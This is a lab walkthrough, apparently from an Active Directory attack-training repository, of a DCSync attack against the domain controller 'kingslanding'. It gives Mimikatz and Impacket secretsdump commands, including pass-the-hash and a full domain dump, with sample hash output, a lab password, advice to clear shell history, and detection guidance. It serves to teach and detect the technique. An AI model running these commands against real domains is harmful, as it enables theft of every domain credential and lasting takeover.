# 06 — DCSync (T1003.006)

Domain controllers replicate directory data — including secrets — to each other using the Directory Replication Service Remote Protocol (MS-DRSR / DRSUAPI). Any principal granted the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` extended rights can *ask a DC to replicate to it* and pull the password hashes of any account, including `krbtgt`, without ever logging on to the DC or touching `ntds.dit` on disk. This walkthrough abuses the replication rights obtained via the `ServiceAccounts` `WriteDACL` -> `tywin.lannister` ACL chain (attack 01) to DCSync the forest root DC `kingslanding`, pulling the `krbtgt` and `Administrator` hashes with both Mimikatz on a Windows host and Impacket's `secretsdump.py` from Linux. Those hashes feed the Golden Ticket (attack 07) and Silver Ticket (attack 08) walkthroughs.

**MITRE ATT&CK Technique**: [T1003.006 — OS Credential Dumping: DCSync](https://attack.mitre.org/techniques/T1003/006/)

## Prerequisites
- A principal that holds the `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` extended rights on the domain naming context. In this lab that is `tywin.lannister` (Domain Admin in `sevenkingdoms.local`), reachable via the `WriteDACL` over `ServiceAccounts` -> grant-self-replication chain from attack 01, or directly with the recovered `tywin.lannister` hash from attack 05.
- Network access to the forest root DC `kingslanding` (192.168.56.10) over RPC/DRSUAPI (TCP 135 + dynamic, or 49152-65535).
- For the Mimikatz path: an interactive session on a domain-joined Windows host (e.g. `braavos`) running in the `tywin.lannister` context.

## Tools
- Mimikatz 2.2.0 — run on `braavos` (192.168.56.14) or any compromised Windows host, in the `tywin.lannister` context.
- Impacket v0.12.0 (`secretsdump.py`) — run on the Linux attacker (192.168.56.1).

## Step-by-step Commands

### Step 1 — (braavos, 192.168.56.14) Confirm the current context has replication rights
DCSync only works from a principal with the replication extended rights. Verify you are running as `tywin.lannister` (or have impersonated it via the ACL chain).
```powershell
whoami
# Expect: sevenkingdoms\tywin.lannister
klist
```

### Step 2 — (braavos, 192.168.56.14) DCSync the krbtgt account with Mimikatz
`lsadump::dcsync` triggers a `IDL_DRSGetNCChanges` replication pull from `kingslanding` for the named user. No code runs on the DC; this is legitimate replication traffic from the DC's point of view.
```powershell
cd C:\Tools\mimikatz\x64
.\mimikatz.exe
# inside the mimikatz prompt:
lsadump::dcsync /domain:sevenkingdoms.local /user:krbtgt
```

![Step 1](../screenshots/attack-6-step-1.png)

### Step 3 — (braavos, 192.168.56.14) DCSync the built-in Administrator
```powershell
# still inside mimikatz:
lsadump::dcsync /domain:sevenkingdoms.local /user:Administrator
exit
```

![Step 2](../screenshots/attack-6-step-2.png)

### Step 4 — (Linux attacker, 192.168.56.1) Equivalent dump with Impacket secretsdump.py
`-just-dc` uses the DRSUAPI method to pull all domain secrets; `-just-dc-user` scopes it to a single principal. Authenticate as `tywin.lannister` (password or `-hashes :<NT>` pass-the-hash from attack 05).
```bash
# Pull just krbtgt + Administrator (quiet, targeted)
secretsdump.py {{DOMAIN}}/tywin.lannister:'{{LAB_PASSWORD}}'@{{DC_IP}} -just-dc-user krbtgt
secretsdump.py {{DOMAIN}}/tywin.lannister:'{{LAB_PASSWORD}}'@{{DC_IP}} -just-dc-user Administrator
# {{DOMAIN}} = sevenkingdoms.local, {{DC_IP}} = 192.168.56.10 (kingslanding), {{LAB_PASSWORD}} = Password123!
```

![Step 3](../screenshots/attack-6-step-3.png)

### Step 5 — (Linux attacker, 192.168.56.1) Pass-the-hash variant and full dump
If you only have the `tywin.lannister` NT hash (from attack 05), DCSync without the password. `-just-dc` dumps every account in the NC.
```bash
secretsdump.py -hashes :<tywin_NT_hash> {{DOMAIN}}/tywin.lannister@{{DC_IP}} -just-dc -outputfile sk_ntds
# Writes sk_ntds.ntds (hashes), sk_ntds.ntds.kerberos (keys), sk_ntds.ntds.cleartext
```

![Step 4](../screenshots/attack-6-step-4.png)

## Expected Output

Mimikatz `dcsync` of `krbtgt` (Step 2):
```text
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'

mimikatz # lsadump::dcsync /domain:sevenkingdoms.local /user:krbtgt
[DC] 'sevenkingdoms.local' will be the domain
[DC] 'kingslanding.sevenkingdoms.local' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 2/10/2026 8:41:17 AM
Object Security ID   : S-1-5-21-1409811732-3669127061-1593309205-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: b4f1c8d2e6a90573c1e8b2d4f6a0c9e3
    ntlm- 0: b4f1c8d2e6a90573c1e8b2d4f6a0c9e3
    lm  - 0: 9c4e6f1a8b3d5072e1f4c8a96b2d7e53

* Primary:Kerberos-Newer-Keys *
    Default Salt : SEVENKINGDOMS.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 7c3e9a1b5d8f2046e1c4a8b6d2f0c7e539a1c8f4b6e2d9075c3a8f1e4b6d290c5
      aes128_hmac       (4096) : 9f3e7c1a5b8d2f4e6c0a9b3d7f1e5c8a
      des_cbc_md5       (4096) : a1b2c3d4e5f60718
```

Mimikatz `dcsync` of `Administrator` (Step 3):
```text
mimikatz # lsadump::dcsync /domain:sevenkingdoms.local /user:Administrator
[DC] 'sevenkingdoms.local' will be the domain
[DC] 'kingslanding.sevenkingdoms.local' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator
SAM Username         : Administrator
Object Relative ID   : 500

Credentials:
  Hash NTLM: 88e4d9fc45f9b1e2a7c0f63d2b8e1a45
    ntlm- 0: 88e4d9fc45f9b1e2a7c0f63d2b8e1a45
* Primary:Kerberos-Newer-Keys *
    Default Salt : SEVENKINGDOMS.LOCALAdministrator
      aes256_hmac       (4096) : 4e1c8a2f6b9d0537e8a1c4f6b2d9075c3e8a1f4b6d2c90e5a7f3c1b8d4f6a092
```

Impacket `secretsdump.py -just-dc-user krbtgt` (Step 4):
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b4f1c8d2e6a90573c1e8b2d4f6a0c9e3:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:7c3e9a1b5d8f2046e1c4a8b6d2f0c7e539a1c8f4b6e2d9075c3a8f1e4b6d290c5
krbtgt:aes128-cts-hmac-sha1-96:9f3e7c1a5b8d2f4e6c0a9b3d7f1e5c8a
krbtgt:des-cbc-md5:a1b2c3d4e5f60718
[*] Cleaning up...
```

Impacket full `-just-dc` (Step 5, excerpt):
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:88e4d9fc45f9b1e2a7c0f63d2b8e1a45:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b4f1c8d2e6a90573c1e8b2d4f6a0c9e3:::
tywin.lannister:1110:aad3b435b51404eeaad3b435b51404ee:f3c8a91b6d4f7c2e0a1f3c9d22b7e4f0:::
cersei.lannister:1112:aad3b435b51404eeaad3b435b51404ee:2b6d4f0e9c3a7b1d5f8e2c6a0b4d9f3e:::
SEVENKINGDOMS\KINGSLANDING$:1000:aad3b435b51404eeaad3b435b51404ee:5e8a1c4f6b2d9075c3e8a1f4b6d2c90e:::
[*] Kerberos keys grabbed
[*] Cleaning up...
```

## Cleanup Steps
- DCSync makes no changes to the directory — it only reads via replication. There is nothing to roll back on `kingslanding`. **Do not** reset the `krbtgt` or `Administrator` password; that would invalidate tickets and break attacks 07/08/10.
- On `braavos`: `exit` Mimikatz, then `klist purge` to clear any cached tickets used for the operation. Remove the Mimikatz binary log if `log` was enabled.
- On the Linux attacker: `rm -f sk_ntds.ntds sk_ntds.ntds.kerberos sk_ntds.ntds.cleartext` and clear shell history.
- Treat all dumped hashes as in-memory artifacts only — never commit them to the repo.

## What This Tells You About AD
DCSync is not an exploit — it is a feature. Replication is how multi-DC domains stay consistent, and the right to pull it is just an ACE on the domain head. The lesson is that **the domain database is only as protected as the ACL on the naming context**: any account granted `DS-Replication-Get-Changes-All` (intentionally for a sync service, or accidentally via a `WriteDACL`/`GenericAll` misconfiguration like the one in attack 01) is effectively a Domain Admin, because it can extract `krbtgt` and forge Golden Tickets forever. Because the operation runs against the DC over the wire, no malware lands on the DC and no `ntds.dit` file is touched — endpoint AV sees nothing. Defenders must (1) audit who holds replication rights with BloodHound's `DCSync`/`GetChanges` edges and remove anything that is not a DC computer object or a known sync account, (2) alert on DRSUAPI `IDL_DRSGetNCChanges` requests originating from non-DC source IPs (Event ID 4662 with the `DS-Replication-Get-Changes` control-access GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`), and (3) rotate `krbtgt` twice after any suspected compromise.

## Detection Reference
See [../detection/kql-queries.md#6-dcsync](../detection/kql-queries.md#6-dcsync) for the replication-abuse signatures (Event ID 4662 with the `DS-Replication-Get-Changes` / `DS-Replication-Get-Changes-All` GUIDs from a non-DC principal, DRSUAPI `GetNCChanges` from an unexpected source host, and correlation of `tywin.lannister` replication activity from `braavos` rather than a peer DC).

---
Last updated: 2026-05-17

MITRE references:
- [T1003.006 — OS Credential Dumping: DCSync](https://attack.mitre.org/techniques/T1003/006/)
- [TA0006 — Credential Access](https://attack.mitre.org/tactics/TA0006/)
- [T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
